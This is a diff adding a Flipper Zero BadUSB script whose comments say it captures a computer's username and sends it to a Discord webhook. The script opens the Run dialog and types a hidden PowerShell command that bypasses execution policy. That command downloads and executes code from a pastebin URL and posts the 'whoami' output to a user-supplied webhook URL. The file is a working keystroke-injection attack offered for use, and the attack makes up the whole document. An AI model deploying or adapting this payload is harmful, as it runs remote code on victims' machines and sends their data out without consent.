@@ -1,0 +1,14 @@
+REM ---- Gets the username of the computer and sends it to a discord webhook ---- 
+REM
+REM "ALTSTRING" is way slower than regular "STRING", but the difference between my keyboard layout and the default output of the FlipperZero turns " into @
+REM This way ensures compatability across devices anyways
+REM
+REM Pastebin link is a duplicate of SendStringToDiscord.ps1 - https://github.com/Noele/FlipperZero/blob/main/badusb/GetPcUser/SendStringToDiscord.ps1
+REM
+REM Replace "DISCORD_WEBHOOK_URL" with your own discord webhook url
+REM
+DELAY 1000 
+GUI r 
+DELAY 300
+ALTSTRING powershell -w h -NoP -Ep Bypass iex (iwr "https://pastebin.com/raw/p3tzh6z9" -UseBasicParsing).Content; SendStringToDiscord (whoami) "DISCORD_WEBHOOK_URL"
+ENTER
